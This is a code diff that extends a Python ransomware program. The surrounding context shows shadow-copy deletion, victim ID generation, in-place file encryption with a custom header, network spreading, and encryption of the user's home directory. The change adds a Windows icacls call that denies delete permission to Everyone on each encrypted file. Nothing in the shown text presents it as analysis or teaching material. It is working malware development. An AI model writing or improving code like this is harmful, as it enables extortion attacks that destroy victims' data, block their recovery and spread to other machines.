@@ -53,6 +53,18 @@ def delete_shadow_copies():
         except Exception:
             pass
 
+# === PREVENT FILE DELETION (Windows ONLY) ===
+def deny_delete(filepath):
+    """
+    On Windows, denies delete permissions for all users using icacls.
+    """
+    if os.name == 'nt':
+        try:
+            # Remove delete permission for all users
+            subprocess.call(f'icacls "{filepath}" /deny Everyone:(D)', shell=True)
+        except Exception as e:
+            print(f"Failed to set delete-prevention on {filepath}: {e}")
+
 # === ENCRYPTION FUNCTIONS (d, e) ===
 def generate_victim_id(length=16):
     return ''.join(random.choices(string.ascii_uppercase + string.digits, k=length))
@@ -93,6 +105,8 @@ def encrypt_file_inplace(filepath, public_key):
             f.write(b'BJZ1' + struct.pack('H', len(encrypted_key)) + encrypted_key + iv + encrypted_data)
         # Restore timestamps (e)
         os.utime(filepath, (atime, mtime))
+        # Prevent deletion
+        deny_delete(filepath)
     except Exception as e:
         print(f"Error encrypting {filepath}: {e}")
 
@@ -192,5 +206,5 @@ if __name__ == "__main__":
         network_spread(sys.executable)
     except Exception as e:
         print(f"Network spread error: {e}")
-    # Encrypt files (d, e)
+    # Encrypt files (d, e, delete prevention)
     main(os.path.expanduser("~"))
